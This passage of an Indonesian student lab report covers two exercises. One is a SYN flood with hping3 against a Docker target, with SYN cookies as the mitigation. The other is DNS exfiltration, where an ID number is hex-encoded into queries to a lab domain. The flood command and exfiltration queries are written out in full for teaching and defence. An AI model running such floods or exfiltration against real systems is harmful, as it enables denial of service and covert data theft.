Meski kenaikannya kecil, hasil ini **tetap merupakan bukti valid** bahwa SYN flood berhasil menimbulkan minimal satu koneksi *half-open* (`SYN_RECV`) yang sebelumnya tidak ada — menunjukkan prinsip serangan bekerja, walau skala dampaknya terbatas oleh karakteristik lab lokal[cite: 6].

### 2. Hasil capture `tcpdump`[cite: 6]

Capture `tcpdump` yang dijalankan bersamaan dengan `curl http://target` menangkap **12 paket** yang justru menunjukkan *three-way handshake yang lengkap dan normal*, bukan paket dari serangan flood:

```
SYN       → 172.19.0.2:59884 → 172.19.0.3:80   (langkah 1: SYN)[cite: 6]
SYN-ACK   ← 172.19.0.3:80    → 172.19.0.2:59884 (langkah 2: SYN-ACK)[cite: 6]
ACK       → 172.19.0.2:59884 → 172.19.0.3:80    (langkah 3: ACK)[cite: 6]
```

diikuti dengan pertukaran data HTTP (`GET /` → `HTTP/1.1 200 OK`) dan penutupan koneksi normal (`FIN`/`ACK`)[cite: 6].

Ini sebenarnya adalah contoh **three-way handshake yang berhasil sempurna** — bagus sebagai pembanding konsep dengan kondisi serangan[cite: 6]. Namun capture ini **tidak menangkap paket SYN flood dari `hping3`**[cite: 6]. Kemungkinan penyebabnya:

- `hping3 -S -p 80 --flood target` dijalankan dengan `timeout 15`, dan ada jeda waktu (karena mengetik ulang perintah secara manual di PowerShell) sebelum perintah `tcpdump` benar-benar dieksekusi — kemungkinan window 15 detik sudah habis sebelum capture dimulai[cite: 6].
- `tcpdump` berjalan di sisi **attacker**, bukan di sisi **target**; jika paket flood dikirim lebih cepat dari *buffer* capture, atau antarmuka yang dipantau tidak sinkron dengan traffic flood yang sudah selesai, traffic tersebut tidak akan muncul di capture ini[cite: 6].

**Catatan kejujuran laporan:** capture ini valid sebagai bukti mekanisme three-way handshake normal, tetapi tidak membuktikan langsung paket flood[cite: 6]. Bukti paket flood sudah terwakili secara tidak langsung oleh perubahan `SYN_RECV` (0 → 1) pada langkah sebelumnya[cite: 6].

## Penjelasan Konsep: Three-Way Handshake vs SYN Flood[cite: 6]

**Three-way handshake normal** (SYN → SYN-ACK → ACK) terlihat jelas pada capture `tcpdump` di atas: client mengirim SYN, server membalas SYN-ACK sambil mengalokasikan entri di *backlog queue* (status `SYN_RECV`), lalu client menyelesaikan dengan ACK — barulah koneksi dianggap `ESTABLISHED` dan backlog dibersihkan[cite: 6].

**SYN flood** mengeksploitasi langkah kedua: penyerang mengirim banyak paket SYN (biasanya dengan source IP acak/spoofed) tanpa pernah mengirim ACK penutup[cite: 6]. Server tetap mengalokasikan entri backlog untuk setiap SYN yang diterima dan menunggu ACK yang tidak akan pernah datang, hingga backlog penuh dan server menolak koneksi baru yang sah — inilah bentuk *Denial of Service*[cite: 6].

## Mitigasi: SYN Cookies[cite: 6]

Mitigasi standar untuk SYN flood adalah **SYN cookies** (`net.ipv4.tcp_syncookies = 1` di Linux)[cite: 6]. Alih-alih menyimpan status koneksi di backlog saat menerima SYN, server mengenkripsi informasi koneksi (sequence number, MSS, dsb.) ke dalam *sequence number* balasan SYN-ACK itu sendiri, tanpa mengalokasikan memori backlog[cite: 6]. Jika client membalas dengan ACK yang valid, server bisa merekonstruksi state koneksi dari ACK number tersebut tanpa pernah menyimpan state sebelumnya — sehingga serangan SYN flood (yang tidak pernah mengirim ACK balik) tidak lagi menghabiskan resource backlog server[cite: 6].

Kelemahan SYN cookies: beberapa opsi TCP (seperti window scaling penuh) tidak bisa disimpan dalam cookie, sehingga performa koneksi sedikit berkurang dibanding koneksi normal — namun ini trade-off yang wajar dibanding downtime akibat DoS[cite: 6].

## Screenshot[cite: 6]
Lihat folder `screenshot/` untuk bukti visual[cite: 6].

---

# Tugas 7 (Pertemuan 7): DNS Exfiltration — Kasus 6[cite: 7]

> **Status: sebagian berhasil, sebagian masih dalam troubleshooting.** Laporan ini mendokumentasikan progres apa adanya, termasuk kendala teknis yang ditemukan dan analisis root cause-nya, sesuai hasil eksekusi nyata[cite: 7].

## Perintah yang dijalankan[cite: 7]

```powershell
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml up -d[cite: 7]

# Encode NIM ke hex (dijalankan di dalam container attacker, bukan di PowerShell host)[cite: 7]
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "echo -n 24552011060 | xxd -p"[cite: 7]

# Kirim query DNS exfiltration (hex hasil encode sebagai subdomain)[cite: 7]
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131303630.k6.exfil.lab @dns[cite: 7]

# Diagnostik: dig lengkap (bukan +short) untuk melihat status response[cite: 7]
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig 3234353532303131303630.k6.exfil.lab @dns[cite: 7]

# Cek statistik dnsmasq[cite: 7]
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec dns kill -USR1 1[cite: 7]
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k6.log[cite: 7]

# Decode kembali hex ke NIM asli (verifikasi integritas data)[cite: 7]
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "echo 3234353532303131303630 | xxd -r -p"[cite: 7]
```

> Catatan teknis PowerShell: `echo -n` dan `xxd` tidak tersedia native di Windows, sehingga dijalankan di dalam container Linux (`attacker`) via `docker compose exec ... sh -c "..."`, bukan langsung di shell host[cite: 7].

## Output terminal[cite: 7]

**Encode NIM ke hex:**
```
3234353532303131303630[cite: 7]
```

**Query `dig +short` (hasil kosong):**
```
(tidak ada output)[cite: 7]
```

**Query `dig` lengkap (menunjukkan status error):**
```
; <<>> DiG 9.20.30-1-Debian <<>> 3234353532303131303630.k6.exfil.lab[cite: 7]
;; global options: +cmd[cite: 7]
;; Got answer:[cite: 7]
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 24403[cite: 7]
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0[cite: 7]
;; WARNING: recursion requested but not available[cite: 7]

;; QUESTION SECTION:[cite: 7]
;3234353532303131303630.k6.exfil.lab. IN        A[cite: 7]

;; Query time: 4 msec[cite: 7]
;; SERVER: 127.0.0.11#53(127.0.0.11) (UDP)[cite: 7]
;; WHEN: Tue Nov 24 13:51:33 UTC 2026[cite: 7]
;; MSG SIZE  rcvd: 53[cite: 7]
```

**Statistik dnsmasq (`kill -USR1 1` → `docker compose logs dns`):**
```
dns-1  | dnsmasq[1]: started, version 2.90 cachesize 150[cite: 7]
dns-1  | dnsmasq[1]: DNS service limited to local subnets[cite: 7]
dns-1  | dnsmasq[1]: warning: no upstream servers configured[cite: 7]
dns-1  | dnsmasq[1]: read /etc/hosts - 9 names[cite: 7]
dns-1  | dnsmasq[1]: time 1795528080[cite: 7]
dns-1  | dnsmasq[1]: cache size 150, 0/0 cache insertions re-used unexpired cache entries.[cite: 7]
dns-1  | dnsmasq[1]: queries forwarded 0, queries answered locally 0[cite: 7]
dns-1  | dnsmasq[1]: queries for authoritative zones 0[cite: 7]
```

**Decode hex kembali ke NIM asli:**
```
24552011060[cite: 7]
```

## Analisis / Penjelasan[cite: 7]

### Bagian yang berhasil: mekanisme encoding DNS exfiltration[cite: 7]

Proses encode-decode NIM melalui hex berhasil sempurna dan membuktikan prinsip dasar DNS exfiltration:

1. NIM asli `24552011060` di-encode menjadi hex `3234353532303131303630`[cite: 7].
2. Hex tersebut disisipkan sebagai *subdomain* dari domain yang dikontrol penyerang (`k6.exfil.lab`), menghasilkan query `3234353532303131303630.k6.exfil.lab`[cite: 7].
3. Hex yang sama berhasil di-decode kembali menjadi `24552011060` — identik dengan NIM asli[cite: 7].

Ini menunjukkan prinsip inti DNS exfiltration: **data yang ingin dicuri (NIM) disamarkan sebagai bagian dari nama domain** dalam sebuah query DNS yang terlihat sah secara sintaks, lalu pihak yang mengontrol *authoritative DNS server* dari domain tersebut dapat merekonstruksi data asli hanya dengan membaca log query yang masuk — tanpa memerlukan koneksi langsung (TCP/HTTP) antara korban dan penyerang, menjadikannya teknik yang sering lolos dari firewall berbasis port/protokol biasa[cite: 7].

### Kendala: respons `SERVFAIL` dari dnsmasq[cite: 7]

Query DNS yang dikirim ke server `dns` (dnsmasq) tidak dijawab dengan benar — mengembalikan status `SERVFAIL` alih-alih jawaban (atau bahkan `NXDOMAIN` jika domain memang tidak terdaftar)[cite: 7]. Analisis dari log startup dnsmasq dan statistik `kill -USR1 1` menunjukkan akar masalahnya:

- Log startup mencatat **`warning: no upstream servers configured`**[cite: 7].
- Statistik menunjukkan **`queries forwarded 0, queries answered locally 0, queries for authoritative zones 0`** — bahkan setelah query dikirim, dnsmasq mencatat nol *authoritative zone* yang cocok[cite: 7].

Kesimpulan sementara: dnsmasq pada container `dns` kemungkinan **belum dikonfigurasi untuk menjadi authoritative untuk zone `k6.exfil.lab`** (biasanya lewat directive seperti `address=/k6.exfil.lab/...` atau `local=/k6.exfil.lab/` di `/etc/dnsmasq.conf` atau file di `/etc/dnsmasq.d/`)[cite: 7]. Karena domain tersebut dianggap "bukan miliknya", dnsmasq mencoba forward query ke upstream DNS — namun karena tidak ada upstream yang dikonfigurasi, forward tersebut gagal dan menghasilkan `SERVFAIL`[cite: 7].

Diagnosis lanjutan (pengecekan isi `/etc/dnsmasq.conf` dan `/etc/dnsmasq.d/`, serta pengujian query langsung ke IP container `dns`) sedang berjalan untuk memastikan root cause ini dan menemukan perbaikan konfigurasi yang tepat[cite: 7].

### Implikasi terhadap deteksi (`analisis_dns.py`)[cite: 7]

Karena dnsmasq belum logging/menjawab query secara authoritative, isi `dns-k6.log` belum memuat baris query nyata (`3234...k6.exfil.lab`) yang bisa dianalisis oleh script deteksi anomali — hanya memuat pesan startup dan statistik[cite: 7]. Dengan demikian, eksekusi `analisis_dns.py` terhadap log ini belum dapat dijalankan secara bermakna sampai isu konfigurasi dnsmasq ini diperbaiki[cite: 7].

## Langkah Selanjutnya (belum selesai)[cite: 7]

1. Memeriksa isi `/etc/dnsmasq.conf` dan `/etc/dnsmasq.d/` pada container `dns` untuk konfirmasi apakah zone `k6.exfil.lab` sudah/belum terdaftar sebagai authoritative[cite: 7].
2. Jika belum, menambahkan directive yang sesuai (mis. `address=/k6.exfil.lab/0.0.0.0`) dan me-restart service, lalu mengulangi query[cite: 7].
3. Mengaktifkan/memverifikasi `--log-queries` pada dnsmasq agar query exfiltration benar-benar tercatat di log[cite: 7].
4. Menjalankan ulang `python kasus/k9-dns-detect/analisis_dns.py dns-k6.log` (dengan `python`, bukan `python3`, karena `python3` tidak terdaftar sebagai alias di sistem) setelah log berisi data query yang valid[cite: 7].

## Screenshot[cite: 7]
Lihat folder `screenshot/` untuk bukti visual[cite: 7].